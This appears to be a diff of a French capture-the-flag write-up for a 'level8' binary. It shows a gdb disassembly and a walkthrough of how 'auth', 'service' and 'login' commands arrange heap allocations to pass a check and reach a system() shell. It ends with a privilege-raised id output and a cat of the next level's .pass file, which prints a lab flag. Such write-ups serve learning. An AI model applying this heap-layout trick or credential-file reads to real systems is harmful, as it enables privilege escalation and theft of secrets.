@@ -60,7 +60,6 @@ Dump of assembler code for function main:
    0x08048622 <+190>:	sub    $0x1,%eax
    0x08048625 <+193>:	cmp    $0x1e,%eax
    0x08048628 <+196>:	ja     0x8048642 <main+222>
----Type <return> to continue, or q <return> to quit---
    0x0804862a <+198>:	lea    0x20(%esp),%eax
    0x0804862e <+202>:	lea    0x5(%eax),%edx
    0x08048631 <+205>:	mov    0x8049aac,%eax
@@ -143,6 +142,38 @@ Dump of assembler code for function main:
    0x08048736 <+466>:	pop    %edi
    0x08048737 <+467>:	pop    %ebp
    0x08048738 <+468>:	ret    
-End of assembler dump.
 
+> ./level8
+(nil), (nil)
 
+Après inspection du main on voit qu'il y a un printf de 2 pointeurs qui sont donc null pour le moment.
+
+Plus bas on voit qu'il y a une comparaison entre la chaine de caractère "auth " et le buffer
+
+> ./level8
+(nil), (nil)
+> auth 
+0x804a008, (nil)
+
+De même en dessous avec la chaine de caractère "reset" qui permet de free le malloc fait au dessus avec le reste de la chaine de caractère apres "auth "
+
+Puis une nouvelle comparaison mais avec "service"
+
+> service
+0x804a008, 0x804a018
+
+la comparaison pour acceder au shell ensuite est entre auth et auth + 0x20 (0x804a008 et (0x804a008 + 0x20) donc 0x804a008 et 0x804a028)
+hors on a service à 0x804a018 donc si service fait 0x10 de long on atteint 0x804a028 donc en remplissant le buffer pour service de 16octets (15 caractères + \0)
+on passe la condition.
+
+> service aaaaaaaaaa
+0x804a008, 0x804a018
+
+il compare ensuite le buffer et la chaine "login" pour enfin pouvoir rentrer dans l'appel system vers un shell.
+
+>login
+$id
+uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
+
+$cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
